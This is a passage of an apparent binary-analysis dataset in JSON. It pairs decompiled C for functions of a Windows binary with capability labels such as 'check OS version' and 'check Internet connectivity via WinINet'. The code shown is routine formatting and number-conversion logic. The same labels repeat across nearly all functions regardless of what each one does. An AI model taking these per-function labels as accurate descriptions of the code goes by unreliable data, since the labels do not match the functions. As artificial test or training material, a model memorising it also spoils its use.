            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040aa6c(void)\n\n{\n    if (**0x4a5124 != NULL) {\n        (***0x4a5124)();\n        return;\n    }\n    fcn.00403040();\n    return;\n}\n",
        "token_count": 53
    },
    "0040aa9c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040ab6b)\n\nvoid __cdecl fcn.0040aa9c(uint noname_0, uint noname_1, int32_t arg_10h)\n\n{\n    char cVar1;\n    char cVar2;\n    char *in_EAX;\n    char *in_ECX;\n    char *pcVar3;\n    char *extraout_ECX;\n    char *extraout_ECX_00;\n    char *extraout_ECX_01;\n    char *pcVar4;\n    int32_t in_EDX;\n    char *extraout_EDX;\n    char *extraout_EDX_00;\n    char *pcVar5;\n    char *pcVar6;\n    char *pcVar7;\n    uint unaff_ESI;\n    char *pcVar8;\n    uint unaff_EDI;\n    bool bVar9;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar3 = in_ECX + arg_10h;\ncode_r0x0040aac5:\n    pcVar4 = in_ECX;\n    if (in_EDX != 0) {\n        do {\n            if (pcVar4 == pcVar3) break;\n            pcVar5 = pcVar4 + 1;\n            cVar1 = *pcVar4;\n            pcVar7 = pcVar5;\n            if (cVar1 == '%') {\n                if (pcVar5 == pcVar3) break;\n                pcVar7 = pcVar4 + 2;\n                cVar1 = *pcVar5;\n                if (cVar1 != '%') goto code_r0x0040aaef;\n            }\n            *in_EAX = cVar1;\n            in_EDX = in_EDX + -1;\n            pcVar4 = pcVar7;\n            in_EAX = in_EAX + 1;\n            if (in_EDX == 0) break;\n        } while( true );\n    }\ncode_r0x0040ae03:\n    fcn.0040adf3();\n    return;\ncode_r0x0040aaef:\n    in_ECX = pcVar7;\n    if (cVar1 == '-') {\n        if (pcVar7 == pcVar3) goto code_r0x0040ae03;\n        in_ECX = pcVar7 + 1;\n    }\n    cVar2 = fcn.0040ab7e(unaff_EDI, unaff_ESI);\n    pcVar3 = extraout_ECX;\n    if (cVar2 != ':') goto code_r0x0040ab0e;\n    if (in_ECX == extraout_ECX) goto code_r0x0040ae03;\n    pcVar7 = in_ECX + 1;\n    cVar1 = *in_ECX;\n    goto code_r0x0040aaef;\ncode_r0x0040ab0e:\n    pcVar5 = extraout_EDX;\n    if (cVar2 == '.') {\n        if (in_ECX == extraout_ECX) goto code_r0x0040ae03;\n        in_ECX = in_ECX + 1;\n        fcn.0040ab7e(unaff_EDI, unaff_ESI);\n        pcVar3 = extraout_ECX_00;\n        pcVar5 = extraout_EDX_00;\n    }\n    fcn.0040abc6(pcVar5, pcVar3);\n    pcVar7 = pcVar4 + -extraout_ECX_01;\n    if (pcVar4 < extraout_ECX_01) {\n        pcVar7 = NULL;\n    }\n    pcVar4 = extraout_ECX_01;\n    pcVar8 = in_ECX;\n    if (cVar1 == '-') {\n        bVar9 = pcVar5 < extraout_ECX_01;\n        pcVar5 = pcVar5 + -extraout_ECX_01;\n        if (bVar9) {\n            pcVar4 = extraout_ECX_01 + pcVar5;\n            pcVar5 = NULL;\n        }\n        for (; pcVar4 != NULL; pcVar4 = pcVar4 + -1) {\n            *in_EAX = *pcVar8;\n            pcVar8 = pcVar8 + 1;\n            in_EAX = in_EAX + 1;\n        }\n    }\n    pcVar6 = pcVar5 + -pcVar7;\n    if (pcVar5 < pcVar7) {\n        pcVar7 = pcVar7 + pcVar6;\n        pcVar6 = NULL;\n    }\n    for (; pcVar7 != NULL; pcVar7 = pcVar7 + -1) {\n        *in_EAX = ' ';\n        in_EAX = in_EAX + 1;\n    }\n    in_EDX = pcVar6 - pcVar4;\n    if (pcVar6 < pcVar4) {\n        pcVar4 = pcVar4 + in_EDX;\n        in_EDX = 0;\n    }\n    for (; pcVar4 != NULL; pcVar4 = pcVar4 + -1) {\n        *in_EAX = *pcVar8;\n        pcVar8 = pcVar8 + 1;\n        in_EAX = in_EAX + 1;\n    }\n    goto code_r0x0040aac5;\n}\n",
        "token_count": 1194
    },
    "0040ab7e": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ab7e(uint arg_8h, uint arg_ch)\n\n{\n    uint8_t in_AL;\n    uint8_t *in_ECX;\n    int32_t unaff_EBP;\n    uint8_t *unaff_ESI;\n    uint var_ch;\n    uint var_8h;\n    \n    if (in_AL == 0x2a) {\n        if (*(unaff_EBP + -0xc) <= *(unaff_EBP + 8)) {\n            *(unaff_EBP + -0xc) = *(unaff_EBP + -0xc) + 1;\n        }\n        if (unaff_ESI == in_ECX) {\ncode_r0x0040ae03:\n            fcn.0040adf3();\n            return;\n        }\n    }\n    else {\n        while ((0x2f < in_AL && (in_AL < 0x3a))) {\n            if (unaff_ESI == in_ECX) goto code_r0x0040ae03;\n            in_AL = *unaff_ESI;\n            unaff_ESI = unaff_ESI + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 252
    },
    "0040afc8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0040afc8(uint arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    uchar *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    char in_CL;\n    int32_t extraout_ECX;\n    uint32_t uVar3;\n    uchar *puVar4;\n    uchar *puVar5;\n    uint var_2ch;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    \n    iVar1 = 0x13;\n    if (in_CL == '\\0') {\n        iVar1 = arg_ch;\n        if (arg_ch < 2) {\n            iVar1 = 2;\n        }\n        if (0x12 < iVar1) {\n            iVar1 = 0x12;\n        }\n    }\n    uVar2 = 9999;\n    if (1 < arg_10h) {\n        uVar2 = arg_8h;\n    }\n    fcn.0040b29c(uVar2, iVar1);\n    puVar5 = in_EAX;\n    if (var_2ch - 0x7fff < 2) {\n        fcn.0040b0c7();\n        puVar4 = extraout_ECX * 3 + 0x40b0b8;\n        for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar5 = *puVar4;\n            puVar4 = puVar4 + 1;\n            puVar5 = puVar5 + 1;\n        }\n    }\n    else {\n        uVar3 = arg_10h;\n        if ((arg_10h != 1) && ((4 < arg_10h || (iVar1 < var_2ch)))) {\n            uVar3 = 0;\n        }\n        (**(uVar3 * 4 + 0x40b0a4))();\n    }\n    return puVar5 - in_EAX;\n}\n",
        "token_count": 452
    },
    "0040b0c7": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040b0c7(void)\n\n{\n    int32_t unaff_EBP;\n    uchar *unaff_EDI;\n    uint var_2ah;\n    \n    if (*(unaff_EBP + -0x2a) != '\\0') {\n        *unaff_EDI = 0x2d;\n    }\n    return;\n}\n",
        "token_count": 77
    },
    "0040b29c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040b29c(char param_1)\n\n{\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint var_4h;\n    \n    if (param_1 == '\\0') {\n        fcn.0040b2c9(unaff_EBX, unaff_ESI);\n    }\n    else {\n        fcn.0040b3eb(unaff_EBX);\n    }\n    return;\n}\n",
        "token_count": 96
    },
    "0040b2c9": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b2c9(uint arg_8h, uint arg_ch)\n\n{\n    char *pcVar1;\n    float10 fVar2;\n    int16_t *piVar3;\n    ushort uVar4;\n    uint32_t uVar5;\n    uint16_t uVar6;\n    uint8_t uVar8;\n    int32_t iVar7;\n    ushort *unaff_EBX;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    int16_t *piVar9;\n    float10 fVar10;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar6 = *(unaff_ESI + 2);\n    uVar5 = uVar6 & 0x7fff;\n    if ((uVar6 & 0x7fff) == 0) {\ncode_r0x0040b2f4:\n        uVar6 = 0;\n    }\n    else {\n        if (uVar5 != 0x7fff) {\n            *(unaff_EBP + -8) = ((uVar5 - 0x3fff) * 0x4d10 >> 0x10) + 1;\n            fVar10 = fcn.00404114();\n            fVar10 = ROUND(fVar10);\n            fVar2 = *(*(unaff_EBP + -4) + 0x4a1888);\n            *(unaff_EBP + -10) = (fVar2 < fVar10) << 8 | (fVar2 == fVar10) << 0xe;\n            if ((*(unaff_EBP + -10) & 0x4100) != 0) {\n                fVar10 = fVar10 / *(*(unaff_EBP + -4) + 0x4a1894);\n                *(unaff_EBP + -8) = *(unaff_EBP + -8) + 1;\n            }\n            *(unaff_EBP + -0x18) = fVar10;\n            iVar7 = 9;\n            piVar9 = unaff_EBX + 3;\n            do {\n                uVar8 = *(iVar7 + -0x19 + unaff_EBP);\n                piVar3 = piVar9 + 1;\n                *piVar9 = (CONCAT11(uVar8, uVar8 >> 4) & 0xfff) + 0x3030;\n                iVar7 = iVar7 + -1;\n                piVar9 = piVar3;\n            } while (iVar7 != 0);\n            *piVar3 = 0;\n            uVar5 = *(unaff_EBP + -8) + *(unaff_EBP + 8);\n            if (uVar5 < 0) {\n                uVar5 = 0;\n                goto code_r0x0040b2f4;\n            }\n            if (*(unaff_EBP + 0xc) <= uVar5) {\n                uVar5 = *(unaff_EBP + 0xc);\n            }\n            if (uVar5 < 0x12) {\n                if (*(unaff_EBX + uVar5 + 3) < 0x35) goto code_r0x0040b3b6;\n                do {\n                    *(unaff_EBX + uVar5 + 3) = 0;\n                    if (uVar5 - 1 < 0) {\n                        *(unaff_EBX + 3) = 0x31;\n                        *(unaff_EBP + -8) = *(unaff_EBP + -8) + 1;\n                        break;\n                    }\n                    pcVar1 = unaff_EBX + uVar5 + 2;\n                    *pcVar1 = *pcVar1 + '\\x01';\n                    iVar7 = uVar5 + 2;\n                    uVar5 = uVar5 - 1;\n                } while (0x39 < *(unaff_EBX + iVar7));\n            }\n            else {\n                uVar5 = 0x12;\ncode_r0x0040b3b6:\n                do {\n                    *(unaff_EBX + uVar5 + 3) = 0;\n                    if (uVar5 - 1 < 0) {\n                        uVar8 = 0;\n                        goto code_r0x0040b3c9;\n                    }\n                    iVar7 = uVar5 + 2;\n                    uVar5 = uVar5 - 1;\n                } while (*(unaff_EBX + iVar7) == '0');\n            }\n            uVar8 = *(unaff_ESI + 2) >> 8;\ncode_r0x0040b3c9:\n            uVar4 = *(unaff_EBP + -8);\n            goto code_r0x0040b3cc;\n        }\n        if (((*(unaff_ESI + 6) & 0x8000) != 0) && ((*unaff_ESI != 0 || (unaff_ESI[1] != -0x80000000)))) {\n            uVar5 = 0x8000;\n            goto code_r0x0040b2f4;\n        }\n    }\n    uVar8 = uVar6 >> 8;\n    uVar4 = uVar5;\n    *(unaff_EBX + 3) = 0;\ncode_r0x0040b3cc:\n    *unaff_EBX = uVar4;\n    *(unaff_EBX + 1) = uVar8 >> 7;\n    return;\n}\n",
        "token_count": 1199
    },
    "0040b4c8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040b4c8(uint param_1, float10 *param_2)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint8_t *in_EAX;\n    ushort extraout_var;\n    uint8_t *extraout_ECX;\n    uint8_t *extraout_ECX_00;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    int32_t extraout_EDX;\n    uint16_t in_FPUStatusWord;\n    uint16_t uVar5;\n    float10 fVar6;\n    uint16_t uVar7;\n    uint var_4h;\n    \n    uVar2 = *0x4a880f;\n    uVar5 = (in_FPUStatusWord >> 8 & 0x7f) << 8;\n    fcn.0040b57f();\n    uVar1 = *in_EAX;\n    uVar7 = uVar1;\n    if ((uVar1 == 0x2b) || (uVar1 == 0x2d)) {\n        in_EAX = in_EAX + 1;\n    }\n    fcn.0040b58a();\n    iVar4 = 0;\n    puVar3 = extraout_ECX;\n    if (*in_EAX == uVar2) {\n        in_EAX = in_EAX + 1;\n        fcn.0040b58a();\n        iVar4 = -extraout_EDX;\n        puVar3 = extraout_ECX_00;\n    }\n    if (puVar3 != in_EAX) {\n        if ((*in_EAX & 0xdf) == 0x45) {\n            in_EAX = in_EAX + 1;\n            fcn.0040b5a6(iVar4);\n        }\n        fcn.0040b57f();\n        if (*in_EAX == 0) {\n            fVar6 = fcn.00404114();\n            if (uVar7 >> 8 == '-') {\n                fVar6 = -fVar6;\n            }\n            if (uVar7 == '\\0') {\n                *param_2 = fVar6;\n            }\n            else {\n                *param_2 = ROUND(fVar6);\n            }\n            if ((uVar5 & 9) == 0) {\n                return CONCAT31(CONCAT22(extraout_var, uVar5) >> 8, 1);\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 540
    },
    "0040bd30": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040bd30(int32_t arg_8h)\n\n{\n    if (*(arg_8h + -0x13) == '\\0') {\n        fcn.0040badc(*(*(arg_8h + 8) + 8), *(*(arg_8h + 8) + 0xc));\n        *(arg_8h + -0x13) = 1;\n    }\n    return;\n}\n",
        "token_count": 97
    },
    "0040bd68": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040bd68(int32_t arg_8h)\n\n{\n    if (*(arg_8h + -0x1d) == '\\0') {\n        fcn.0040b7fc(arg_8h + -0x1c, *(*(arg_8h + 8) + 8), *(*(arg_8h + 8) + 0xc));\n        *(arg_8h + -0x1d) = 1;\n    }\n    return;\n}\n",
        "token_count": 111
    },
    "0040c03c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040c03c(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    bool bVar2;\n    uint8_t uVar3;\n    uint8_t *in_EAX;\n    uint8_t *puVar4;\n    int32_t iVar5;\n    uint8_t uVar6;\n    uint *in_FS_OFFSET;\n    uint uVar7;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint var_2ch;\n    uint var_28h;\n    uint var_1eh;\n    int16_t var_1ah;\n    int16_t var_18h;\n    uint16_t var_16h;\n    uint var_13h;\n    int32_t var_ch;\n    uint8_t *var_4h;\n    \n    puStack64 = &stack0xfffffffc;\n    uStack68 = 0x40c7c0;\n    uStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    if ((in_EAX != NULL) && (*(arg_8h + -0x108) < 2)) {\n        *(arg_8h + -0x108) = *(arg_8h + -0x108) + 1;\n        var_1eh._0_1_ = 0x20;\n        var_4h = in_EAX;\n        while (*var_4h != 0) {\n            uVar1 = *var_4h;\n            if ((*((uVar1 >> 3) + 0x4a1830) >> (uVar1 & 7) & 1) == 0) {\n                var_4h = fcn.0040e66c();\n                uVar6 = uVar1;\n                if (uVar1 + 0x9f < 0x1a) {\n                    uVar6 = uVar1 - 0x20;\n                }\n                uVar3 = var_1eh;\n                if (((uVar6 + 0xbf < 0x1a) && (uVar3 = uVar6,  uVar6 == 0x4d)) && (var_1eh == 0x48)) {\n                    uVar6 = 0x4e;\n                    uVar3 = uVar6;\n                }\n                var_1eh._0_1_ = uVar3;\n    // switch table (57 cases) at 0x40c15d\n                switch(uVar6) {\n                case 0x22:\n                case 0x27:\n                    while ((*var_4h != 0 && (*var_4h != uVar1))) {\n                        if ((*((*var_4h >> 3) + 0x4a1830) >> (*var_4h & 7) & 1) == 0) {\n                            var_4h = var_4h + 1;\n                        }\n                        else {\n                            var_4h = fcn.0040e66c();\n                        }\n                    }\n                    fcn.0040bc58(arg_8h);\n                    if (*var_4h != 0) {\n                        var_4h = var_4h + 1;\n                    }\n                    break;\n                default:\n                    fcn.0040bc58(arg_8h);\n                    break;\n                case 0x2f:\n                    if (*0x4a8811 != '\\0') {\n                        fcn.0040bc58(arg_8h);\n                    }\n                    break;\n                case 0x3a:\n                    if (*0x4a881c != '\\0') {\n                        fcn.0040bc58(arg_8h);\n                    }\n                    break;\n                case 0x41:\n                    fcn.0040bd68(&stack0xfffffffc);\n                    iVar5 = fcn.0040a8f8();\n                    if (iVar5 == 0) {\n                        fcn.0040bc58(arg_8h);\n                        var_4h = var_4h + 4;\n                    }\n                    else {\n                        iVar5 = fcn.0040a8f8();\n                        if (iVar5 == 0) {\n                            fcn.0040bc58(arg_8h);\n                            var_4h = var_4h + 2;\n                        }\n                        else {\n                            iVar5 = fcn.0040a8f8();\n                            if (iVar5 == 0) {\n                                if (var_16h < 0xc) {\n                                    fcn.0040bc9c(arg_8h);\n                                }\n                                else {\n                                    fcn.0040bc9c(arg_8h);\n                                }\n                                var_4h = var_4h + 3;\n                            }\n                            else {\n                                iVar5 = fcn.0040a8f8();\n                                if (iVar5 == 0) {\n                                    fcn.0040bd30(&stack0xfffffffc);\n                                    uVar7 = *(arg_8h + 8);\n                                    fcn.0040bb6c(uVar7, *(arg_8h + 0xc));\n                                    fcn.0040bc9c(uVar7);\n                                    var_4h = var_4h + 3;\n                                }\n                                else {\n                                    iVar5 = fcn.0040a8f8();\n                                    if (iVar5 == 0) {\n                                        fcn.0040bd30(&stack0xfffffffc);\n                                        uVar7 = *(arg_8h + 8);\n                                        fcn.0040bb6c(uVar7, *(arg_8h + 0xc));\n                                        fcn.0040bc9c(uVar7);\n                                        var_4h = var_4h + 2;\n                                    }\n                                    else {\n                                        fcn.0040bc58(arg_8h);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                    break;\n                case 0x43:\n                    fcn.0040bd04(&stack0xfffffffc);\n                    fcn.0040c03c(arg_8h);\n                    fcn.0040bd68(&stack0xfffffffc);\n                    if (((var_16h != 0) || (var_18h != 0)) || (var_1ah != 0)) {\n                        fcn.0040bc58(arg_8h);\n                        fcn.0040c03c(arg_8h);\n                    }\n                    break;\n                case 0x44:\n                    fcn.0040bd04(&stack0xfffffffc);\n                    if (var_ch - 1U < 2) {\n                        fcn.0040bd30(&stack0xfffffffc);\n                        fcn.0040bcb8(arg_8h);\n                    }\n                    else if (var_ch == 3) {\n                        uVar7 = *(arg_8h + 8);\n                        fcn.0040bb6c(uVar7, *(arg_8h + 0xc));\n                        fcn.0040bc9c(uVar7);\n                    }\n                    else if (var_ch == 4) {\n                        uVar7 = *(arg_8h + 8);\n                        fcn.0040bb6c(uVar7, *(arg_8h + 0xc));\n                        fcn.0040bc9c(uVar7);\n                    }\n                    else if (var_ch == 5) {\n                        fcn.0040c03c(arg_8h);\n                    }\n                    else {\n                        fcn.0040c03c(arg_8h);\n                    }\n                    break;\n                case 0x45:\n                    fcn.0040bd04(&stack0xfffffffc);\n                    fcn.0040bd30(&stack0xfffffffc);\n                    iVar5 = arg_8h;\n                    fcn.0040bf24(&stack0xfffffffc);\n                    fcn.0040bc9c(iVar5);\n                    break;\n                case 0x47:\n                    fcn.0040bd04(&stack0xfffffffc);\n                    fcn.0040bd30(&stack0xfffffffc);\n                    iVar5 = arg_8h;\n                    fcn.0040bda8(&stack0xfffffffc);\n                    fcn.0040bc9c(iVar5);\n                    break;\n                case 0x48:\n                    fcn.0040bd04(&stack0xfffffffc);\n                    fcn.0040bd68(&stack0xfffffffc);\n                    bVar2 = false;\n                    puVar4 = var_4h;\n                    while (*puVar4 != 0) {\n                        if ((*((*puVar4 >> 3) + 0x4a1830) >> (*puVar4 & 7) & 1) == 0) {\n                            uVar1 = *puVar4;\n                            if (uVar1 < 0x49) {\n                                if (uVar1 == 0x48) break;\n                                if ((uVar1 == 0x22) || (uVar1 == 0x27)) {\n                                    bVar2 = bVar2 ^ 1;\n                                }\n                                else if (uVar1 == 0x41) goto code_r0x0040c3b2;\n                            }\n                            else if (uVar1 == 0x61) {\ncode_r0x0040c3b2:\n                                if (!bVar2) {\n                                    iVar5 = fcn.0040a8f8();\n                                    if ((iVar5 != 0) && (iVar5 = fcn.0040a8f8(),  iVar5 != 0)) {\n                                        fcn.0040a8f8();\n                                    }\n                                    break;\n                                }\n                            }\n                            else if (uVar1 == 0x68) break;\n                            puVar4 = puVar4 + 1;\n                        }\n                        else {\n                            puVar4 = fcn.0040e66c();\n                        }\n                    }\n                    if (2 < var_ch) {\n                        var_ch = 2;\n                    }\n                    fcn.0040bcb8(arg_8h);\n                    break;\n                case 0x4d:\n                    fcn.0040bd04(&stack0xfffffffc);\n                    fcn.0040bd30(&stack0xfffffffc);\n                    if (var_ch - 1U < 2) {\n                        fcn.0040bcb8(arg_8h);\n                    }\n                    else if (var_ch - 1U == 2) {\n                        fcn.0040bc9c(arg_8h);\n                    }\n                    else {\n                        fcn.0040bc9c(arg_8h);\n                    }\n                    break;\n                case 0x4e:\n                    fcn.0040bd04(&stack0xfffffffc);\n                    fcn.0040bd68(&stack0xfffffffc);\n                    if (2 < var_ch) {\n                        var_ch = 2;\n                    }\n                    fcn.0040bcb8(arg_8h);\n                    break;\n                case 0x53:\n                    fcn.0040bd04(&stack0xfffffffc);\n                    fcn.0040bd68(&stack0xfffffffc);\n                    if (2 < var_ch) {\n                        var_ch = 2;\n                    }\n                    fcn.0040bcb8(arg_8h);\n                    break;\n                case 0x54:\n                    fcn.0040bd04(&stack0xfffffffc);\n                    if (var_ch == 1) {\n                        fcn.0040c03c(arg_8h);\n                    }\n                    else {\n                        fcn.0040c03c(arg_8h);\n                    }\n                    break;\n                case 0x59:\n                    fcn.0040bd04(&stack0xfffffffc);\n                    fcn.0040bd30(&stack0xfffffffc);\n                    if (var_ch < 3) {\n                        fcn.0040bcb8(arg_8h);\n                    }\n                    else {\n                        fcn.0040bcb8(arg_8h);\n                    }\n                    break;\n                case 0x5a:\n                    fcn.0040bd04(&stack0xfffffffc);\n                    fcn.0040bd68(&stack0xfffffffc);\n                    if (3 < var_ch) {\n                        var_ch = 3;\n                    }\n                    fcn.0040bcb8(arg_8h);\n                }\n            }\n            else {\n                iVar5 = arg_8h;\n                fcn.0040e64c();\n                fcn.0040bc58(iVar5);\n                var_4h = fcn.0040e66c();\n                var_1eh._0_1_ = 0x20;\n            }\n        }\n        *(arg_8h + -0x108) = *(arg_8h + -0x108) + -1;\n    }\n    *in_FS_OFFSET = uStack72;\n    puStack64 = 0x40c7c7;\n    uStack68 = 0x40c7bf;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 2804
    },
    "0040cab0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0040cab0(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    uint uStack20;\n    \n    uStack20 = 0;\n    iVar5 = 7;\n    piVar3 = 0x4a88d8;\n    puVar4 = 0x4a88f4;\n    do {\n        if (*piVar3 == 0) break;\n        uVar1 = fcn.004058fc();\n        fcn.004058fc(uVar1);\n        iVar2 = fcn.0040e894();\n        if (iVar2 != 0) {\n            uStack20 = *puVar4;\n            break;\n        }\n        puVar4 = puVar4 + 1;\n        piVar3 = piVar3 + 1;\n        iVar5 = iVar5 + -1;\n    } while (iVar5 != 0);\n    return CONCAT44(uStack20, uStack20);\n}\n",
        "token_count": 230
    },
    "0040cb04": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040cb04(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    if (*0x4a88cc == 0x12) {\n        if (in_EAX < 100) {\n            uVar1 = fcn.0040bc44();\n            uVar2 = *(arg_8h + -4) >> 0x1f;\n            in_EAX = in_EAX + (((uVar1 & 0xffff) + ((*(arg_8h + -4) ^ uVar2) - uVar2)) / 100) * 100;\n        }\n        if (0 < *(arg_8h + -4)) {\n            *(arg_8h + -4) = -*(arg_8h + -4);\n        }\n    }\n    else {\n        *(arg_8h + -4) = *(arg_8h + -4) + -1;\n    }\n    return *(arg_8h + -4) + in_EAX;\n}\n",
        "token_count": 243
    },
    "0040cb60": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040cb60(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffac;\n    int32_t iStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    ushort var_18h;\n    uint var_16h;\n    ushort var_12h;\n    ushort var_10h;\n    char var_eh;\n    uchar var_dh;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    var_20h = 0;\n    var_8h = 0;\n    uStack64 = 0x40ce82;\n    iStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    var_16h._0_2_ = 0;\n    var_18h = 0;\n    var_1ch._0_1_ = 0;\n    var_dh = 0;\n    var_eh = fcn.0040ca1c();\n    var_4h = 0;\n    if (**0x4a8814 == 'g') {\n        fcn.0040ca68();\n        fcn.00405964(&fcn.0040cb60::var_20h);\n        fcn.00409a78();\n        var_4h = fcn.0040cab0();\n    }\n    else {\n        iVar2 = fcn.0040e7c8();\n        if (0 < iVar2) {\n            var_4h = *0x4a88f4;\n        }\n    }\n    cVar1 = fcn.0040c874(&fcn.0040cb60::var_1ch + 3);\n    if ((cVar1 != '\\0') && (cVar1 = fcn.0040c9e0(),  cVar1 != '\\0')) {\n        in_stack_ffffffac = 0x40cc4e;\n        cVar1 = fcn.0040c874(&fcn.0040cb60::var_1ch + 2);\n        if (cVar1 != '\\0') {\n            cVar1 = fcn.0040c9e0();\n            if (cVar1 == '\\0') {\n                fcn.0040bc44();\n                if (var_eh == '\\x01') {\n                    var_18h = var_10h;\n                    var_16h._0_2_ = var_12h;\n                }\n                else {\n                    var_16h._0_2_ = var_10h;\n                    var_18h = var_12h;\n                }\n            }\n            else {\n                in_stack_ffffffac = &fcn.0040cb60::var_1ch + 1;\n                cVar1 = fcn.0040c874(in_stack_ffffffac);\n                if (cVar1 == 